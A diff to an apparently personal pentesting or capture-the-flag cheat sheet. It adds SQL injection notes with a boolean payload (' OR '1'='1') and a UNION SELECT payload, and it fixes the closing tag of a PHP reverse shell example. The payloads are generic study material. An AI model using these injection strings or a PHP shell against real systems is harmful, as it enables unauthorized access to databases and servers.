@@ -122,6 +122,7 @@
 -------------------------------------
 ## SQL-Injection
 
+*Tip: Look at the source code to check for any IDs such as src="images/***els1***"!*
 * SQL Statements
 
 ```
@@ -137,13 +138,19 @@ Select * FROM table; # Comment
 Select * FROM table; -- Another comment
 ```
 
+* BOOLEAN Attacks
+
+````
+SELECT * FROM items WHERE id='' OR '1' = '1'; -- -'
+````
+
 * Union Attacks
 
+```
+SELECT * FROM items WHERE id='' UNION SELECT null, null, null; -- -'
+```
 
-
-
-
-
+More SQL-Injection links
 
 
 
@@ -168,5 +175,5 @@ Example PHP Reverse Shell:
         echo $result;
         echo '</pre>';
     }
-    >
+    ?>
 
